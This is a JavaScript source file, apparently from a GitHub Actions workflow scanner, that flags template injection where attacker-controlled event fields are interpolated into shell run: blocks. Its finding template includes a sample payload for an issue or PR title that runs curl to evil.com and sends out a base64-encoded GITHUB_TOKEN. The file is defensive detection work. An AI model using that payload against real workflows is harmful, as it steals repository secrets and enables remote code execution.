import { getAllSteps, findLineNumber, extractSnippet } from '../yaml-parser.js';

// Contexts controllable by an external attacker
const DANGEROUS_CONTEXTS = [
  'github.event.issue.title',
  'github.event.issue.body',
  'github.event.pull_request.title',
  'github.event.pull_request.body',
  'github.event.comment.body',
  'github.event.review.body',
  'github.event.discussion.title',
  'github.event.discussion.body',
  'github.head_ref',
  'github.event.workflow_run.head_branch',
  'github.event.workflow_run.head_commit.message',
];

// Patterns matching families of dangerous contexts
// NOTE: github.event.inputs is intentionally excluded — workflow_dispatch requires
// write access, so only trusted collaborators can set input values. It is not an
// external-attacker-controlled source and flagging it creates false positives.
const DANGEROUS_PATTERNS = [
  /github\.event\.pages\.[^}]*page_name/,
  /github\.event\.commits\.[^}]*message/,
  /github\.event\.commits\.[^}]*author\.(name|email)/,
];

const EXPR_REGEX = /\$\{\{([\s\S]*?)\}\}/g;

function isDangerous(expression) {
  const trimmed = expression.trim();
  if (DANGEROUS_CONTEXTS.some(ctx => trimmed.includes(ctx))) return trimmed;
  for (const p of DANGEROUS_PATTERNS) {
    if (p.test(trimmed)) return trimmed;
  }
  return null;
}

export function checkTemplateInjection(workflow, rawContent, filename) {
  const findings = [];
  const steps = getAllSteps(workflow);

  for (const { jobId, jobName, step, stepIndex } of steps) {
    const runBlock = step.run;
    if (typeof runBlock !== 'string') continue;

    let match;
    EXPR_REGEX.lastIndex = 0;
    while ((match = EXPR_REGEX.exec(runBlock)) !== null) {
      const dangerous = isDangerous(match[1]);
      if (!dangerous) continue;

      const lineNumber = findLineNumber(rawContent, match[0].replace(/[.*+?^${}()|[\]\\]/g, '\\$&').slice(0, 30));
      const snippet = extractSnippet(rawContent, lineNumber, 4);

      findings.push({
        id: `template-injection-${filename}-${jobId}-${stepIndex}`,
        rule: 'template-injection',
        severity: 'critical',
        title: 'Template Injection in run: block',
        file: filename,
        line: lineNumber,
        snippet,
        context: `Job: \`${jobName}\`  ·  Step ${stepIndex + 1}${step.name ? ` (${step.name})` : ''}`,
        detail: `Expression \`\${{ ${dangerous.trim()} }}\` is interpolated directly into a shell \`run:\` block.`,
        exploit: `Open an issue/PR with the title or body set to \`'; curl https://evil.com/exfil?t=$(cat $GITHUB_TOKEN | base64) #\`. The shell runs the injected command with full access to secrets and GITHUB_TOKEN.`,
        impact: 'Remote Code Execution + Secret Exfiltration',
        remediation: `Pass the value through an environment variable instead of interpolating it directly:\n\nenv:\n  UNSAFE_INPUT: \${{ ${dangerous.trim()} }}\n\nThen reference \`$UNSAFE_INPUT\` in your shell commands. The value is never parsed as shell syntax.`,
        cvss: {
          score:  10.0,
          vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
          cwe:    'CWE-94',
        },
      });
    }
  }

  return findings;
}
